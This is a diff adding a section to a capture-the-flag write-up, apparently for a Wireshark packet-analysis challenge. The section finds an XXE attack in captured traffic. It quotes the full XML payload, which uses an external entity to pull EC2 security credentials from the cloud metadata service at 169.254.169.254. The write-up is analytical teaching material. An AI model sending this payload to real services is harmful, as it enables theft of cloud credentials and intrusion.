@@ -172,4 +172,12 @@ ip.addr == 18.222.86.32 && ip.src == 10.12.42.16 && http.request.method == GET |
 - Answer: `/proc`
 
 ### IMDS, XXE, and Other Abbreviations
-- 
+- This one is easier, *XXE Attacks* are related to xml. So we gonna just filter *xml* in wireshark.
+```
+ip.addr == 18.222.86.32 && xml
+```
+- Right click on the last packet, Follow > HTTP Stream.
+- We can see here the payload `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [ <!ENTITY id SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"> ]>\n<product><productId>&id;</productId></product>`.
+- Answer: `http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`.
+
+### Open Boria Mine Door
